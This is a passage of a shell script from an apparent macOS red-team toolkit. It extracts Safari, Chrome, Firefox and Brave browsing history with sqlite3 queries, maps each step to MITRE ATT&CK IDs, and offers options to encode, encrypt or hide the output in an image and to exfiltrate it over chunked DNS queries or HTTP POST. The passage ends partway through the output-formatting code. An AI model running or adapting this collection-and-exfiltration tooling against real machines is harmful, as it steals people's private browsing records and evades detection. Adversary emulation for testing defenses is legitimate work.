#!/bin/sh
# POSIX-compliant
# Procedure Name: browser_history
# Tactic: Discovery
# Technique: T1217
# GUID: 67929a7e-8431-4893-a4e1-5a6743c5605d
# Intent: Extract browser history from Safari, Chrome, Firefox, and Brave on macOS.
# Author: @darmado | https://x.com/darmad0
# created: 2025-05-27
# Updated: 2025-06-03
# Version: 2.0.4
# License: Apache 2.0

# Core function Info:
# This is a standalone base script template that can be used to build any technique.

#------------------------------------------------------------------------------
# Configuration Section
#------------------------------------------------------------------------------
NAME="" 
# MITRE ATT&CK Mappings
TACTIC="Discovery" #replace with you coresponding tactic
TTP_ID="T1217" #replace with you coresponding ttp_id

TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
TACTIC_ENCODE="Defense Evasion" # DO NOT MODIFY
TTP_ID_ENCODE="T1140" # DO NOT MODIFY
TTP_ID_ENCODE_BASE64="T1027.001" # DO NOT MODIFY
TTP_ID_ENCODE_HEX="T1027" # DO NOT MODIFY
TTP_ID_ENCODE_PERL="T1059.006" # DO NOT MODIFY
TTP_ID_ENCODE_PERL_UTF8="T1027.010" # DO NOT MODIFY
TACTIC_STEG="Defense Evasion" # DO NOT MODIFY
TTP_ID_STEG="T1027.013" # DO NOT MODIFY
TTP_ID_ENCRYPT_XOR="T1027.007" # DO NOT MODIFY

# Add a unique job ID for tracking
JOB_ID=""  # Will be set after core functions are defined

# Script Information

SCRIPT_CMD="$0 $*"
SCRIPT_STATUS="running"
OWNER="$USER"
PARENT_PROCESS="shell"

# Core Commands
CMD_BASE64="base64"
CMD_BASE64_OPTS=""  # macOS base64 doesn't use -w option
CMD_CURL="curl"
CMD_CURL_OPTS="-L -s -X POST"
CMD_CURL_SECURITY="--fail-with-body --insecure"
CMD_CURL_TIMEOUT="--connect-timeout 5 --max-time 10 --retry 1 --retry-delay 0"
CMD_DATE="date"
CMD_DATE_OPTS="+%Y-%m-%d %H:%M:%S"  # Fixed for macOS compatibility
CMD_DEFAULTS="defaults"
CMD_DIG="dig"
CMD_DIG_OPTS="+short"
CMD_FIND="find"
CMD_LAUNCHCTL="launchctl"
CMD_OPENSSL="openssl"
CMD_PKGUTIL="pkgutil"
CMD_PRINTF="printf"
CMD_SPCTL="spctl"
CMD_SYSTEM_PROFILER="system_profiler"
CMD_XXD="xxd"
CMD_PERL="perl"
CMD_PS="ps"
CMD_LOGGER="logger"
CMD_AWK="awk"
CMD_SED="sed"
CMD_GREP="grep"
CMD_TR="tr"
CMD_HEAD="head"
CMD_TAIL="tail"
CMD_SLEEP="sleep"
CMD_GPG="gpg"
CMD_GPG_OPTS="--batch --yes --symmetric --cipher-algo AES256 --armor"
CMD_STRINGS="strings"
CMD_HOST="host"
CMD_NSLOOKUP="nslookup"
CMD_HOSTNAME="hostname"
CMD_STAT="stat"
CMD_SQLITE3="sqlite3"
CMD_MKDIR="mkdir"
CMD_MV="mv"
CMD_CP="cp"
CMD_LS="ls"
CMD_WHOAMI="whoami"
CMD_ID="id"
CMD_WC="wc"
CMD_CAT="cat"
CMD_LSOF="lsof"

SAFARI=false
CHROME=false
FIREFOX=false
BRAVE=false
INPUT_SEARCH=""
INPUT_LAST=""
INPUT_STARTTIME=""
INPUT_ENDTIME=""

INPUT_LAST=7
INPUT_SEARCH=""
CMD_SQLITE3="sqlite3"
DB_HISTORY_SAFARI="$HOME/Library/Safari/History.db"
DB_HISTORY_CHROME="$HOME/Library/Application Support/Google/Chrome/Default/History"
CMD_QUERY_BROWSER_DB="$CMD_SQLITE3 -separator '|'"
DB_HISTORY_BRAVE="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/History"
DB_HISTORY_FIREFOX="$HOME/Library/Application Support/Firefox/Profiles/*.default-release/places.sqlite"
SAFARI_HDB_QUERY="WITH headers AS ( SELECT 'source' as source, 'domain' as domain, 'title' as title,  'visit_date' as visit_date, 'url' as url, 'visit_count' as visit_count ) SELECT * FROM headers UNION ALL SELECT  'Safari' as source, hi.domain_expansion as domain, hv.title, datetime(hv.visit_time + 978307200, 'unixepoch', 'localtime') as visit_date, hi.url, hi.visit_count FROM history_items hi JOIN history_visits hv ON hi.id = hv.history_item WHERE hv.visit_time > (strftime('%s', 'now') - 978307200 - (\$INPUT_LAST * 86400)) \$INPUT_SEARCH ORDER BY visit_date DESC"
CHROME_HDB_QUERY="WITH headers AS ( SELECT 'source' as source, 'url' as url, 'title' as title,  'visit_date' as visit_date, 'visit_count' as visit_count ) SELECT * FROM headers UNION ALL SELECT  'Chrome' as source, url, title, datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit, visit_count FROM urls WHERE last_visit_time > ((strftime('%s', 'now') - \$INPUT_LAST * 86400) * 1000000) \$INPUT_SEARCH ORDER BY last_visit DESC"
FIREFOX_HDB_QUERY="WITH headers AS ( SELECT 'source' as source, 'url' as url, 'title' as title,  'visit_date' as visit_date, 'visit_count' as visit_count ) SELECT * FROM headers UNION ALL SELECT  'Firefox' as source, url, title, datetime(last_visit_date/1000000, 'unixepoch', 'localtime') as last_visit, visit_count FROM moz_places WHERE last_visit_date > ((strftime('%s', 'now') - \$INPUT_LAST * 86400) * 1000000) \$INPUT_SEARCH ORDER BY last_visit DESC"
BRAVE_HDB_QUERY="WITH headers AS ( SELECT 'source' as source, 'url' as url, 'title' as title,  'visit_date' as visit_date, 'visit_count' as visit_count ) SELECT * FROM headers UNION ALL SELECT  'Brave' as source, url, title, datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit, visit_count FROM urls WHERE last_visit_time > ((strftime('%s', 'now') - \$INPUT_LAST * 86400) * 1000000) \$INPUT_SEARCH ORDER BY last_visit DESC LIMIT 1000"

# Project root path (set by build system)
PROJECT_ROOT="/Users/darmado/tools/opensource/attack-macOS"  # Set by build system to project root directory

# Procedure Information (set by build system)
PROCEDURE_NAME="browser_history"  # Set by build system from YAML procedure_name field

# Function execution tracking
FUNCTION_LANG=""  # Ued by log_output at execution time

# Logging Settings
HOME_DIR="${HOME}"
LOG_DIR="${PROJECT_ROOT}/logs"  # Project root logs directory (PROJECT_ROOT set by build system)
LOG_FILE_NAME="${TTP_ID}_${PROCEDURE_NAME}.log"
LOG_MAX_SIZE=$((5 * 1024 * 1024))  # 5MB
LOG_ENABLED=false
SYSLOG_TAG="${TTP_ID}_${PROCEDURE_NAME}"

# Default settings
DEBUG=false
ALL=false
SHOW_HELP=false
STEG_TRANSFORM=false # Enable steganography transformation
STEG_EXTRACT=false # Extract hidden data from steganography
STEG_EXTRACT_FILE="" # File to extract hidden data from
ISOLATED=false # Enable memory isolation mode

# OPSEC Check Settings (enabled by build script based on YAML configuration)
CHECK_PERMS="false"
CHECK_FDA="true"
CHECK_DB_LOCK="false"


# Output Configuration
FORMAT=""          # json, csv, or empty for raw
JSON_WRAP_LINES=true # Whether to wrap each line in quotes in JSON
JSON_DETECT_NUMBERS=true # Try to detect numbers in JSON
ENCODE="none"      # base64, hex, perl_b64, perl_utf8
ENCRYPT="none"     # aes, gpg, none
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
EXFIL_START=""
EXFIL_END=""
CHUNK_SIZE=50      # Default chunk size for DNS exfiltration (bytes)
PROXY_URL=""       # Proxy URL for HTTP/HTTPS operations
ENCODING_TYPE="none"
ENCRYPTION_TYPE="none"
EXFIL_TYPE="none"

# TCC Database Paths
TCC_SYSTEM_DB="/Library/Application Support/com.apple.TCC/TCC.db"
TCC_USER_DB="$HOME/Library/Application Support/com.apple.TCC/TCC.db"

# Default Steganography Carrier Image
DEFAULT_STEG_CARRIER="/System/Library/Desktop Pictures/Monterey Graphic.heic"

#------------------------------------------------------------------------------
# CORE FUNCTIONS FROM base.sh
#------------------------------------------------------------------------------
# NOTE: All core functions are prefixed with 'core_' to avoid namespace conflicts
# with script-specific functions. When creating scripts that source this file,
# use your own function names to prevent collisions.

# Purpose: Get the current timestamp in a consistent format
# Inputs: None
# Outputs: Timestamp string in "YYYY-MM-DD HH:MM:SS" format
# - None
core_get_timestamp() {
    # Use direct command to avoid variable expansion issues
    date "+%Y-%m-%d %H:%M:%S"
}

# Purpose: Generate a unique job ID for tracking script execution
# Inputs: None
# Outputs: 8-character hexadecimal job ID
# - None
core_generate_job_id() {
    # Simple random job ID - just a random identifier
    printf "%08x" "$((RANDOM * RANDOM))"
}

# Purpose: Print debug messages to stderr when debug mode is enabled
# Inputs: $1 - Message to print
# Outputs: None (prints directly to stderr)
# - Writes to stderr if DEBUG=true
core_debug_print() {
    if [ "$DEBUG" = true ]; then
        local timestamp=$(core_get_timestamp)
        $CMD_PRINTF "[DEBUG] [%s] %s\n" "$timestamp" "$1" >&2
    fi
}

# Purpose: Print verbose messages to stdout when verbose mode is enabled
# Inputs: $1 - Message to print
# Outputs: None (prints directly to stdout)
# - Writes to stdout if VERBOSE=true

# Purpose: Handle errors consistently with proper formatting and logging
# Inputs: $1 - Error message
# Outputs: None (prints directly to stderr)
# - 
#   - Writes to stderr
#   - Logs error message if LOG_ENABLED=true
#   - Returns error code 1
core_handle_error() {
    local error_msg="$1"
    local timestamp=$(core_get_timestamp)
    $CMD_PRINTF "[ERROR] [%s] %s\n" "$timestamp" "$error_msg" >&2
    
    if [ "$LOG_ENABLED" = true ]; then
        core_log_output "$error_msg" "error" false
    fi
    
    return 1
}

# Purpose: Log output to the log file with automatic rotation and consistent formatting
# Inputs: 
#   $1 - Output data to log
#   $2 - Status type (info, error, etc.), defaults to "info"
#   $3 - Skip data flag (true/false), defaults to false
# Outputs: None
# 
#   - Creates log directory if it doesn't exist
#   - Writes to log file if LOG_ENABLED=true
#   - Rotates log file if size exceeds LOG_MAX_SIZE
#   - Writes to syslog with logger
#   - Writes to stdout if DEBUG or VERBOSE is true
core_log_output() {
    local output="$1"
    local status="${2:-info}"
    local skip_data="${3:-false}"
    
    if [ "$LOG_ENABLED" = true ]; then
        # Ensure log directory exists and is writable
        if [ ! -d "$LOG_DIR" ]; then
            $CMD_MKDIR -p "$LOG_DIR" 2>/dev/null || {
                $CMD_PRINTF "Warning: Failed to create log directory.\n" >&2
                return 1
            }
        fi
        
        # Check if directory is writable
        if [ ! -w "$LOG_DIR" ]; then
            $CMD_PRINTF "Warning: Log directory not writable: %s\n" "$LOG_DIR" >&2
            return 1
        fi
        
        # Ensure LOG_FILE_NAME is set and not empty
        if [ -z "$LOG_FILE_NAME" ]; then
            $CMD_PRINTF "Warning: LOG_FILE_NAME is empty or not set.\n" >&2
            return 1
        fi
        
        # Check if log file exists and handle ownership/permission issues
        if [ -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
            if [ ! -w "$LOG_DIR/$LOG_FILE_NAME" ]; then
                # File exists but not writable - create new log with timestamp suffix
                local timestamp=$(date +%Y%m%d_%H%M%S)
                local base_name="${LOG_FILE_NAME%.*}"
                local extension="${LOG_FILE_NAME##*.}"
                LOG_FILE_NAME="${base_name}_${timestamp}.${extension}"
                core_debug_print "Original log not writable, using: $LOG_FILE_NAME"
            fi
        fi
        
        # Create log file if it doesn't exist
        if [ ! -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
            if ! touch "$LOG_DIR/$LOG_FILE_NAME" 2>/dev/null; then
                $CMD_PRINTF "Error: Failed to create log file: %s\n" "$LOG_DIR/$LOG_FILE_NAME" >&2
                return 1
            fi
            core_debug_print "Created new log file: $LOG_DIR/$LOG_FILE_NAME"
        fi
        
        # Check log size and rotate if needed
        if [ -f "$LOG_DIR/$LOG_FILE_NAME" ] && [ "$($CMD_STAT -f%z "$LOG_DIR/$LOG_FILE_NAME" 2>/dev/null || "$CMD_PRINTF" 0)" -gt "$LOG_MAX_SIZE" ]; then
            $CMD_MV "$LOG_DIR/$LOG_FILE_NAME" "$LOG_DIR/${LOG_FILE_NAME}.$(date +%Y%m%d%H%M%S)" 2>/dev/null
            core_debug_print "Log file rotated due to size limit"
        fi
        
        core_debug_print "Writing log entry to: $LOG_DIR/$LOG_FILE_NAME"
        
        # Log detailed entry
        "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s language=%s status=%s\\n" \
            "$(core_get_timestamp)" \
            "$status" \
            "$$" \
            "${JOB_ID:-NOJOB}" \
            "$OWNER" \
            "$PARENT_PROCESS" \
            "$TTP_ID" \
            "$TACTIC" \
            "${FORMAT:-raw}" \
            "$ENCODING_TYPE" \
            "${ENCRYPTION_TYPE:-none}" \
            "${EXFIL_TYPE:-none}" \
            "${FUNCTION_LANG:-shell}" \
            "$status" >> "$LOG_DIR/$LOG_FILE_NAME"
            
        if [ "$skip_data" = "false" ] && [ -n "$output" ]; then
            "$CMD_PRINTF" "command: %s\\ndata:\\n%s\\n---\\n" \
                "$SCRIPT_CMD" \
                "$output" >> "$LOG_DIR/$LOG_FILE_NAME"
        else
            "$CMD_PRINTF" "command: %s\\n---\\n" \
                "$SCRIPT_CMD" >> "$LOG_DIR/$LOG_FILE_NAME"
        fi

        # Also log to syslog
        $CMD_LOGGER -t "$SYSLOG_TAG" "job=${JOB_ID:-NOJOB} status=$status ttp_id=$TTP_ID tactic=$TACTIC exfil=${EXFIL_TYPE:-none} encoding=$ENCODING_TYPE encryption=${ENCRYPTION_TYPE:-none} language=${FUNCTION_LANG:-shell} cmd=\"$SCRIPT_CMD\""
    fi
    
    # Output to stdout if in debug mode only
    if [ "$DEBUG" = true ]; then
        $CMD_PRINTF "[%s] [%s] %s\\n" "$(core_get_timestamp)" "$status" "$output"
    fi
}

#Purpose: Validate input strings for security and format compliance
#Inputs: 
#  $1 - Input string to validate
#  $2 - Validation type (string|integer|domain|url|file_path)
#Outputs: 0 if valid, 1 if invalid
#- Prints error message to stderr on validation failure
core_validate_input() {
    local input="$1"
    local validation_type="$2"
    
    # Check for empty input
    if [ -z "$input" ]; then
        core_handle_error "Empty input not allowed for type: $validation_type"
        return 1
    fi
    
    case "$validation_type" in
        "string")
            # Allow alphanumeric, spaces, hyphens, underscores, dots
            if "$CMD_PRINTF" "$input" | $CMD_GREP -q '[^a-zA-Z0-9 ._-]'; then
                core_handle_error "Invalid characters in string input: $input"
                return 1
            fi
            ;;
        "string_special")
            # For search terms and special input, just escape for SQL safety
            # Don't block legitimate characters - only handle actual security risks
            
            # Check for null bytes (actual security risk) using a simpler approach
    case "$input" in
                *$'\0'*)
                    core_handle_error "Null bytes not allowed in input: $input"
                    return 1
                    ;;
            esac
            
            # For SQL contexts, the calling function should handle escaping
            # We don't need to block legitimate characters here
            core_debug_print "Input validation passed for: $input"
            ;;
        "integer")
            # Must be a positive integer
            if ! "$CMD_PRINTF" "$input" | $CMD_GREP -q '^[0-9]\+$'; then
                core_handle_error "Invalid integer input: $input"
                return 1
            fi
            ;;
        "domain")
            # Basic domain format validation
            if ! "$CMD_PRINTF" "$input" | $CMD_GREP -q '^[a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9]$'; then
                core_handle_error "Invalid domain format: $input"
                return 1
            fi
            ;;
        "url")
            # Basic URL format validation
            if ! "$CMD_PRINTF" "$input" | $CMD_GREP -q '^https\?://[a-zA-Z0-9][a-zA-Z0-9.-]*'; then
                core_handle_error "Invalid URL format: $input"
                return 1
            fi
            ;;
        "file_path")
            # Basic file path validation - no null bytes, reasonable length
            if "$CMD_PRINTF" "$input" | $CMD_GREP -q $'\0' || [ ${#input} -gt 4096 ]; then
                core_handle_error "Invalid file path: $input"
                return 1
            fi
            ;;
        *)
            core_handle_error "Unknown validation type: $validation_type"
            return 1
            ;;
    esac
    
    return 0
}

# Purpose: Extract domain from URL for validation
# Inputs: $1 - URL string
# Outputs: Domain part of URL
# - None
core_extract_domain_from_url() {
    local url="$1"
    "$CMD_PRINTF"  "$url" | sed -E 's~^https?://([^/:]+).*~\1~'
}

# Purpose: Validate that essential commands are available before script execution
# Inputs: None
# Outputs: None
# Logic:
#   - Returns 1 if any essential command is missing
#   - Calls core_handle_error on missing commands
core_validate_command() {
    local missing=""
    
    # Only check commands base.sh always needs
    for cmd in date printf; do
        if ! command -v "$cmd" > /dev/null 2>&1; then
            missing="$missing $cmd"
        fi
    done
    
    if [ -n "$missing" ]; then
        core_handle_error "Missing essential commands:$missing"
        return 1
    fi
    
    return 0
}

# Purpose: Check if a domain resolves to a valid IP address
# Inputs: $1 - Domain to check
# Outputs: 0 if domain resolves, 1 if not
# - Prints error message if domain doesn't resolve
core_validate_domain() {
    local domain="$1"
    
    # Skip empty domains
    [ -z "$domain" ] && return 0
    
    # Skip IP addresses
    if "$CMD_PRINTF"  "$domain" | $CMD_GREP -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' > /dev/null; then
        return 0
    fi
    
    # Try DNS resolution with fallback tools - assume commands exist
    local resolved=""
    
        resolved=$($CMD_DIG $CMD_DIG_OPTS "$domain" A 2>/dev/null)
        if [ -n "$resolved" ]; then
            return 0
        fi
    
        resolved=$($CMD_HOST "$domain" 2>/dev/null | $CMD_GREP "has address" | $CMD_HEAD -1)
        if [ -n "$resolved" ]; then
            return 0
        fi
    
        resolved=$($CMD_NSLOOKUP "$domain" 2>/dev/null | $CMD_GREP "Address:" | $CMD_GREP -v "#53" | $CMD_HEAD -1)
        if [ -n "$resolved" ]; then
            return 0
        fi
    
    core_handle_error "Domain does not resolve: $domain"
    return 1
}

# Purpose: Parse command-line arguments and set global variables (NO VALIDATION)
# Inputs: $@ - All command-line arguments passed to the script
# Outputs: None
# - Sets global flag variables based on command-line options
core_parse_args() {
    # Track unknown arguments and missing values for error reporting
    UNKNOWN_ARGS=""
    MISSING_VALUES=""
    
    while [ "$#" -gt 0 ]; do
        case "$1" in
            -h|--help)
                SHOW_HELP=true
                ;;
            -d|--debug)
                DEBUG=true
                ;;
            -l|--log)
                LOG_ENABLED=true
                ;;
            --format|--output-format)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    # Next arg starts with -, so no value provided
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                    FORMAT="$2"
                    shift
                else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --encode)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                    ENCODE="$2"
                    ENCODING_TYPE="$2"
                    shift
                else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --encrypt)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                    ENCRYPT="$2"
                    ENCRYPTION_TYPE="$2"
                    shift
                else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --exfil-dns)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                        EXFIL=true
                        EXFIL_METHOD="dns"
                        EXFIL_TYPE="dns"
                        EXFIL_URI="$2"
                    shift
                    else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --exfil-http)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                        EXFIL=true
                        EXFIL_METHOD="http"
                        EXFIL_TYPE="http"
                        EXFIL_URI="$2"
                    shift
                    else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --exfil-uri)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                            EXFIL=true
                            EXFIL_TYPE="uri"
                            EXFIL_URI="$2"
                    # Determine method based on URI format (will be validated later)
                    if "$CMD_PRINTF"  "$2" | $CMD_GREP -q "^http"; then
                            EXFIL_METHOD="http"
                        else
                        EXFIL_METHOD="dns"
                    fi
                    shift
                else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --chunk-size)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                    CHUNK_SIZE="$2"
                    shift
                else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --proxy)
                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                    MISSING_VALUES="$MISSING_VALUES $1"
                elif [ -n "$2" ]; then
                    PROXY_URL="$2"
                    shift
                else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --steganography)
                STEG_TRANSFORM=true
                ;;
            --steg-extract)
                STEG_EXTRACT=true
                if [ -n "$2" ] && [ ! "$2" = "${2#-}" ]; then
                    STEG_EXTRACT_FILE="./hidden_data.png"
                elif [ -n "$2" ]; then
                    STEG_EXTRACT_FILE="$2"
                    shift
                else
                    STEG_EXTRACT_FILE="./hidden_data.png"
                fi
                ;;
            --steg-extract-file)
                if [ -n "$2" ] && [ ! "$2" = "${2#-}" ]; then
                    STEG_EXTRACT_FILE="$2"
                    shift
                else
                    MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            --verbose)
                DEBUG=true
                ;;
            --isolated)
                ISOLATED=true
                ;;
# We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
        -s|--safari)
            SAFARI=true
            ;;
        -c|--chrome)
            CHROME=true
            ;;
        -f|--firefox)
            FIREFOX=true
            ;;
        -b|--brave)
            BRAVE=true
            ;;
        --search)
            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                MISSING_VALUES="$MISSING_VALUES $1"
            elif [ -n "$2" ]; then
                INPUT_SEARCH="$2"
                    shift
            else
                MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
        --last)
            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                MISSING_VALUES="$MISSING_VALUES $1"
            elif [ -n "$2" ]; then
                INPUT_LAST="$2"
                    shift
            else
                MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
        --starttime)
            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                MISSING_VALUES="$MISSING_VALUES $1"
            elif [ -n "$2" ]; then
                INPUT_STARTTIME="$2"
                    shift
            else
                MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
        --endtime)
            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                MISSING_VALUES="$MISSING_VALUES $1"
            elif [ -n "$2" ]; then
                INPUT_ENDTIME="$2"
                    shift
            else
                MISSING_VALUES="$MISSING_VALUES $1"
                fi
                ;;
            *)
                # Collect unknown arguments for error reporting
                if [ -z "$UNKNOWN_ARGS" ]; then
                    UNKNOWN_ARGS="$1"
                else
                    UNKNOWN_ARGS="$UNKNOWN_ARGS $1"
                fi
                ;;
        esac
        shift
    done
    
    core_debug_print "Arguments parsed: DEBUG=$DEBUG, LOG_ENABLED=$LOG_ENABLED, FORMAT=$FORMAT, ENCODE=$ENCODE, ENCRYPT=$ENCRYPT"
    
    # Report unknown arguments as warnings but don't exit
    if [ -n "$UNKNOWN_ARGS" ]; then
        "$CMD_PRINTF"  "[WARNING] [%s] Unknown arguments: %s\n" "$(core_get_timestamp)" "$UNKNOWN_ARGS" >&2
    fi
    
    # Report missing values as warnings but don't exit
    if [ -n "$MISSING_VALUES" ]; then
        "$CMD_PRINTF"  "[WARNING] [%s] Arguments missing required values: %s\n" "$(core_get_timestamp)" "$MISSING_VALUES" >&2
    fi
}

# Display help message
core_display_help() {
    cat << EOF
Usage: ${0##*/} [OPTIONS]

Description: Base script for ATT&CK macOS techniques
MITRE ATT&CK: ${TTP_ID} - ${TACTIC}

HELP:
  -h, --help                    Display this help message
  -d, --debug                   Enable debug output (includes verbose output)

SCRIPT:
  -s|--safari                      Extract Safari history
  -c|--chrome                      Extract Chrome history
  -f|--firefox                     Extract Firefox history
  -b|--brave                       Extract Brave history
  --search VALUE                   Search for specific terms in history
  --last NUMBER                    Last N days to search
  --starttime VALUE                Start time in YY-MM-DD HH:MM:SS format
  --endtime VALUE                  End time in YY-MM-DD HH:MM:SS format

EXECUTION:
  --isolated                    Enable memory isolation mode (spawns isolated processes)

Output Options:
  --format TYPE                 
                                - json: Structured JSON output
                                - csv: Comma-separated values
                                - raw: Default pipe-delimited text

ENCODING/OBFUSCATION
  --encode TYPE                
                                - base64/b64: Base64 encoding using base64 command
                                - hex/xxd: Hexadecimal encoding using xxd command
                                - perl_b64: Perl Base64 implementation using perl
                                - perl_utf8: Perl UTF8 encoding using perl

  --steganography              Hide output in image file using native macOS tools
  --steg-extract [FILE]        Extract hidden data from steganography image (default: ./hidden_data.png)

ENCRYPTION:
  --encrypt TYPE               
                                - aes: AES-256-CBC encryption using openssl command
                                - gpg: GPG symmetric encryption using gpg command
                                - xor: XOR encryption with cyclic key (custom implementation)

EXFILTRATION:
  --exfil-dns DOMAIN            Exfiltrate data via DNS queries using dig command
                                Data is automatically base64 encoded and chunked

  --exfil-http URL              Exfiltrate data via HTTP POST using curl command
                                Data is sent in the request body
                                Data is automatically chunked to avoid URL length limits

  --chunk-size SIZE           Size of chunks for DNS/HTTP exfiltration (default: $CHUNK_SIZE bytes)
  --proxy URL                 Use proxy for HTTP requests (format: protocol://host:port)

  LOGGING:

  -l, --log                     Create a log file (creates logs in ./logs directory)

Notes:
- When using encryption with exfiltration, keys are automatically sent via DNS TXT records
- JSON output includes metadata about execution context
- Log files are automatically rotated when they exceed ${LOG_MAX_SIZE} bytes
- Exfiltration is enabled automatically when specifying any exfil method
- DNS exfiltration automatically chunks data and sends start/end signals
- Steganography uses native macOS image manipulation without external dependencies
EOF
}

# Purpose: Process raw output according to format, encoding, and encryption settings
# Inputs:
#   $1 - Raw output data to process
#   $2 - Data source identifier (defaults to "generic")
# Outputs: Processed output (formatted/encoded/encrypted as requested)
# Logic:
#   - May set global ENCODING_TYPE and ENCRYPTION_TYPE variables
core_process_output() {
    local output="$1"
    local data_source="${2:-generic}"
    local processed="$output"
    local is_encoded=false
    local is_encrypted=false
    local is_steganography=false
    
    # 1. Format the output first if requested
    if [ -n "$FORMAT" ]; then
        if [ "$FORMAT" = "json" ] || [ "$FORMAT" = "JSON" ]; then
            # For JSON, only use raw data here - we'll add transformation metadata at the end
            processed=$(core_format_output "$output" "$FORMAT" "$PROCEDURE_NAME" "false" "none" "false" "none" "false")
        else
            # For other formats, just format the raw output
            processed=$(core_format_output "$output" "$FORMAT" "$PROCEDURE_NAME")
        fi
        core_debug_print "Output formatted as $FORMAT"
    fi
    # 2. Apply encoding if requested (after formatting)
    if [ "$ENCODE" != "none" ]; then
        core_debug_print "Applying encoding: $ENCODE"
        processed=$(core_encode_output "$processed" "$ENCODE")
        is_encoded=true
    fi
    # 3. Apply encryption if requested (after encoding)
    if [ "$ENCRYPT" != "none" ]; then
        core_debug_print "Applying encryption: $ENCRYPT"
        processed=$(core_encrypt_output "$processed" "$ENCRYPT")
        is_encrypted=true
    fi
    
    # 4. Apply steganography if requested (after encryption)
    if [ "$STEG_TRANSFORM" = true ]; then
        core_debug_print "Applying steganography transformation"
        # Save the processed data to the steganography image
        local steg_result=$(core_apply_steganography "$processed")
        # Only set the output metadata, the actual file is written directly
        processed="$steg_result"
        is_steganography=true
    fi
    
    # 5. If JSON formatting was requested, add the final metadata about transformations
    if [ -n "$FORMAT" ] && [ "$FORMAT" = "json" ] || [ "$FORMAT" = "JSON" ]; then
        # We already formatted the output, but add the transformation metadata
        if [ "$is_encoded" = true ] || [ "$is_encrypted" = true ] || [ "$is_steganography" = true ]; then
            # Don't double-wrap in JSON, just return the processed data with transformation flags
            # The metadata about transformations is informational only for the user
            core_debug_print "Preserving encoded/encrypted data in output"
        fi
    fi
    
    $CMD_PRINTF "%s" "$processed"
}

# Purpose: Format output based on requested format (JSON, CSV, etc.)
# Inputs:
#   $1 - Output data to format
#   $2 - Format type (json, csv, or other for raw)
#   $3 - Data source identifier (defaults to "generic")
#   $4-7 - Additional parameters for JSON metadata
# Outputs: Formatted data
# - None
core_format_output() {
    local output="$1"
    local format="$2"
    # Convert to lowercase using tr for sh compatibility
    format=$("$CMD_PRINTF" '%s' "$format" | tr '[:upper:]' '[:lower:]')
    local data_source="${3:-generic}"
    local is_encoded="${4:-false}"
    local encoding="${5:-none}"
    local is_encrypted="${6:-false}"
    local encryption="${7:-none}"
    local is_steganography="${8:-false}"
    local formatted="$output"
    
    case "$format" in
        json|json-lines)
            formatted=$(core_format_as_json "$output" "$PROCEDURE_NAME" "$is_encoded" "$encoding" "$is_encrypted" "$encryption" "$is_steganography")
            ;;
        csv)
            formatted=$(core_format_as_csv "$output")
            ;;
        *)
            # Keep as raw
            ;;
    esac
    
    $CMD_PRINTF "%s" "$formatted"
}

# Purpose: Convert output data to JSON format with metadata
# Inputs:
#   $1 - Output data to convert to JSON
#   $2 - Data source identifier
#   $3 - Whether data is encoded (true/false)
#   $4 - Encoding method
#   $5 - Whether data is encrypted (true/false)
#   $6 - Encryption method
#   $7 - Whether steganography is used (true/false)
# Outputs: JSON-formatted string with data and metadata
# - None
core_format_as_json() {
    local output="$1"
    local data_source="${2:-generic}"
    local is_encoded="${3:-false}"
    local encoding="${4:-none}"
    local is_encrypted="${5:-false}"
    local encryption="${6:-none}"
    local is_steganography="${7:-false}"
    local json_output=""
    local timestamp=$(core_get_timestamp)
    
    # Create JSON structure - POSIX-compliant approach with direct string concatenation
    json_output="{"
    json_output="$json_output
  \"timestamp\": \"$timestamp\","
    json_output="$json_output
  \"command\": \"$SCRIPT_CMD\","
    json_output="$json_output
  \"jobId\": \"$JOB_ID\","
